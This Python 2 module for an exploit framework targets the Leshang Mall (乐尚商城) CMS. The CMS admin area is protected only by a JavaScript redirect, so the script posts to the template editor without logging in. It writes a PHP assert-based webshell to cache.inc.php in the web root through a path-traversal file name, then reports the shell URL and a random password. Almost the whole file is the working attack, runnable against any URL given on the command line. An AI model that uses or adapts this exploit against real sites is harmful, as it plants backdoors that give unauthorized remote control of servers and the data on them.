#coding: utf-8

import os
import sys
import datetime
import urllib
from exp_template import Exploit, Level, session, get_random_password
import re, random

"""
构造函数需要传递以下参数:
url      要测试的目标
taskid   默认为0，当没有创建任务时使用
targetid 默认为0，当没有创建任务时使用

exp需要实现的方法为meta_info和exploit

"""
class leshang_unauthorized_fileupload(Exploit):
    def meta_info(self):
        return {
            'name': 'leshang_unauthorized_fileupload',
            'author': 'h',
            'date': '2018-04-12',
            'attack_type': 'GetShell',
            'app_type': 'CMS',              #路由器为Router
            'app_name': '乐尚商城',
            'min_version': '',
            'max_version': '',
            'version_list': '',             #min_version,max_version 和 verion_list 二者必选其一
            'description': '后台登陆权限使用JS跳转，则无需登陆可以操作后台，通过后台修改模板功能上传Webshell。',
            'reference':'leshang_getshell.docx',   #参考文档
            'cve':'',
        } 
        
    def exploit(self):
        if self.url == '' or (not self.url.startswith('http://') and not self.url.startswith('https://')):
            self.report('url error', Level.error)
            return
        for i in range(10):
            self.url = self.url.strip('/')
        req = session()
        try:
            rsp = req.get(url=self.url)
        except:
            self.report('连接目标失败', Level.error)
            return
        try:
            randpass = get_random_password()
            upload_data = {
                'tpl_content':'<?php @assert($_POST[%s]); ?>' % randpass,
                'name':'/../../../../../cache.inc.php',
                'dir':'tpl',
            }
            rsp = req.post(self.url+'/admin.php/code/mod', data=upload_data)
            print rsp.text
            self.shell_info(self.url+ '/cache.inc.php', randpass, 'php')
        except Exception as e:
            print e
            return
        
if __name__ == "__main__":
    # url = 'http://localhost:90/WWW/'
    # a = leshang_unauthorized_fileupload(url)
    # a.exploit()
    if len(sys.argv) == 2:
        a = leshang_unauthorized_fileupload(sys.argv[1])
        a.exploit()
    else:
        print '%s url' %  __file__
        print '%s http://192.168.1.11' %  __file__


